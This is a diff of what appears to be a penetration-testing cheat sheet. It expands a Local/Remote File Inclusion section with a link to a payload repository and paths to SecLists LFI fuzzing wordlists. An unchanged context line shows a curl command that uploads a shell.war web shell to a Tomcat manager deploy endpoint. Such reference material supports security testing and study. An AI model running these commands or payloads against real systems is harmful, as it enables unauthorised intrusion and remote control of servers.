@@ -56,7 +56,17 @@
 
 <code>curl -v -u [USER]:[PASSWORD]] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>
 
-### LFI/RFI
+### Local File Inclusion / Remote File Inclusion (LFI / RFI)
+
+<code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</code>
+
+#### LFI Lists
+
+Linux: <code>/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>
+
+Windows: <code>/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>
+
+Both: <code>/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>
 
 ## FTP 
 
